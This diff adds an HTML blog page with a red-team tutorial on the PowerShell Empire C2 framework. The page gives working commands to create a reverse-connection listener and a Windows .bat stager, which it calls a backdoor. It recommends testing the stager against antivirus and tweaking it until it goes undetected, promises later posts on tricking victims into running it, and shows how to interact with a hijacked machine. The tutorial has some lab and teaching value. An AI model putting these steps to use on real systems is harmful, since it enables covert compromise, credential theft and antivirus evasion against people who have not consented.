@@ -1,0 +1,185 @@
+<!DOCTYPE HTML>
+<html>
+<!-- Infosec by 3r4th -->
+
+<head>
+    <title>Empire Overview</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+</head>
+
+<body class="is-preload">
+
+    <!-- Wrapper -->
+    <div id="wrapper">
+
+        <!-- Main -->
+        <div id="main">
+            <div class="inner">
+
+                <!-- Header -->
+                <header id="header">
+                    <a href="index.html" class="logo"><strong>InfoSec</strong> by 3r4th</a>
+                    <ul class="icons">
+                        <li><a href="https://github.com/3r4th" target="_blank" class="icon brands fa-github"><span
+                                    class="label">Github</span></a></li>
+                    </ul>
+                </header>
+
+                <!-- Content -->
+                <section>
+                    <header class="main">
+                        <h1>Get Started With Empire</h1>
+                    </header>
+
+                    <span class="image main"><img src="images/pic03.jpg" alt="" /></span>
+                    <p>Empire is an Open Source C2 Framework which can be used for creating payloads, evading AV
+                        programs as well as for post-exploitation. Before we talk about why it should be part of our
+                        hacking tools, we need to quickly understand how it works 🤔 </p>
+                    <p>There are four main components :
+                        <ul>
+                            <li><b>Listeners</b> : listen for incoming connections from the target machines.</li>
+                            <li><b>Listeners</b> : listen for incoming connections from the target machines.</li>
+                            <li><b>Stagers</b> : allow our evil code to be run via the agent on the compromised machine.
+                                A backdoor in other words.</li>
+                            <li><b>Modules</b> : Execute our evil code, steal credentials and much more.</li>
+                        </ul>
+                    </p>
+                    <p>Good, here are the advantages 👇 :
+                        <ul>
+                            <li>Unlike other frameworks, Empire agents keep trying to communicate with us, so if our
+                                listener dies, we <b>will not lose the connection</b>. </li>
+                            <li><b>No need to configure</b> listeners each time Empire is launched because the defined
+                                parameters do not change unless we explicitly do so.</li>
+                            <li>Since it is open source and modular, we can use our <b>own scripts</b> there. </li>
+                            <li>Empire is a pure PowerShell framework, and since most targets nowadays use Windows so
+                                <b>PowerShell payloads</b> is a bit safe here. Therefore Empire implements the ability
+                                to run
+                                PowerShell agents <b>without needing powershell.exe</b> in order to bypass security
+                                policies
+                                which block access to powershell.exe. </li>
+                            <li>For any <b>Unix</b> based machines, we can use <b>Python</b> based Empire <b>agents</b>
+                            </li>
+                            <li>Definitely companies use a proxy for any kind of web requests. Empire <b>automatically
+                                    picks up</b> the <b>proxy</b> and the <b>cached credentials</b> and send them back
+                                to us.</li>
+                            <li>We can change our payload settings, which leads to <b>bypass signature-based AV
+                                    detection</b>,
+                                deleting our payload, and blocking the established connection.</li>
+                            <li><b>Malicious actions</b> taken by Empire are not run on the hard drive but <b>in
+                                    memory</b>, this
+                                reduces the likelihood of being caught by AV or by forensics investigators.</li>
+                        </ul>
+                    </p>
+                    <p>Enough talk, let’s jump in ☕️ : </p>
+                    <h2>Install Empire :</h2>
+                    <pre><code>cd /opt
+git clone https://github.com/EmpireProject/Empire.git
+cd Empire/setup
+./install.sh</code></pre>
+
+                    <h2>Run Empire :</h2>
+                    <pre><code>./empire
+help # show what each command does</code></pre>
+
+
+                    <h2>Configure and create a listener :</h2>
+                    <pre><code>listeners # this will take us to listener menu
+uselistener http # in this case, the communication will be done over HTTP 
+info # to show options about the listener used
+set Port 8080 # to change options use the 'set' command
+set Host http://your_ip_addr:8080 # because we gonna use a reverse connection
+execute # this will create the listener
+back # to go back to the list of listeners
+list # to list the active listeners
+back #  to go to the main menu</code></pre>
+                    <p>Our <b>listener</b> gonna wait for incoming connections on <b>port 8080</b>, so if someone runs
+                        our stager, we will be able to catch that connection and have full control over it 👌</p>
+
+
+                    <h2>Create a stager for Windows :</h2>
+                    <pre><code>usestager windows/launcher_bat # this creates an executable with a bat extension for Windows
+info # to show options that we can set for this stager
+set listener http # to set the listener that will be used
+set OutFile /var/www/html/evil-files/empire_http_8080.bat # to specify the path where the out file gonna be stored in our kali machine
+execute # to create the stager</code></pre>
+                    <p><b>Before sending</b> the stager to the target machine, use <b>nodistribute</b> website to check
+                        if it is detectable by any AV program. If it is get detected, you have to keep playing around
+                        with the parameters until you get the best results 😕 </p>
+                    <p>Don’t worry this <b>website will not share</b> the results <b>with the AV programs</b> and in
+                        <b>later post</b> we will see how to make our <b>stager undetectable</b> 😈</p>
+                    <p>To test it, you need to have a Windows VM connected to the same NAT network as your Kali.
+                        On Kali :
+                        <pre><code>service apache2 start</code></pre>
+                    </p>
+                    <p>On the Windows target machine navigate to <b>http://kali_ip_addr/evil-files/</b>, then download
+                        the stager and execute it. Note that this is not the best way to deliver a backdoor as no one
+                        will intentionally execute it. But in the upcoming posts we will learn how 😉 </p>
+                    <p>Well, to interact with the active agent which has just been created :
+                        <pre><code>agents # to list all connections
+interact "the_name_of_the_agent" # to get inside the hacked machine
+sysinfo # to get the system information</code></pre>
+                    </p>
+                    <p>Perfect, first step done and we will get into more detail in later post. This is only the
+                        beginning, so stay tuned 😎. Well there you go, I hope you liked it and don’t forget to leave a
+                        comment 😊 </p>
+                    <p>To be continued …</p>
+                    <h2>References :</h2>
+                    <p><a href="https://www.powershellempire.com/" target="_blank">Click
+                            here for more information about Powershell Empire</a></p>
+                </section>
+
+            </div>
+        </div>
+
+        <!-- Sidebar -->
+        <div id="sidebar">
+            <div class="inner">
+
+                <!-- Menu -->
+                <nav id="menu">
+                    <header class="major">
+                        <h2>Menu</h2>
+                    </header>
+                    <ul>
+                        <li><a href="index.html">all posts</a></li>
+                        <li>
+                            <span class="opener">by category</span>
+                            <ul>
+                                <li><a href="malware_analysis.html">malware analysis</a></li>
+                                <li><a href="red_team.html">red team</a></li>
+                            </ul>
+                        </li>
+                        <!-- <li><a href="elements.html">elements</a></li> -->
+                    </ul>
+                </nav>
+
+                <!-- Section -->
+                <section>
+                    <header class="major">
+                        <h2>Get in touch</h2>
+                    </header>
+                    <ul class="contact">
+                        <li class="icon solid fa-envelope">mustapha.djebablia@gmail.com</li>
+                        <li class="icon brands fa-linkedin"><a
+                                href="https://www.linkedin.com/in/mustapha-djebablia-a8705a195" target="_blank">Mustapha
+                                Djebablia</a></li>
+                        <li class="icon solid fa-phone">(+33) 616741856</li>
+                    </ul>
+                </section>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Scripts -->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
